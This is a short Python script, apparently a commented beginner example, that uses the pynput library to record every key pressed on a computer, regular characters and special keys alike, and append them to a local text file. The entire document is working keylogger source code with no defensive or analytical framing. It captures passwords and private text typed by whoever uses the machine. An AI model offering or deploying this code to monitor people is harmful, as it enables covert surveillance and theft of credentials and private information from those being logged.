from pynput import keyboard

log_file = "keystrokes_saved.txt" #The file where all the logged key presses will be saved

def on_key_press(key):
    try:
        with open(log_file, 'a') as f: #The 'a' stands for append. This opens the file in append mode, so new content is added without erasing existing content.
            if hasattr(key, 'char') and key.char:
                f.write(f"{key.char}\n") # Log regular character keys
            else:
                f.write(f"{key}\n") # Log special keys (Ctrl, Shift, Esc, etc.)
    
    except Exception as e:
        print(f"Error logging key press: {e}")

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
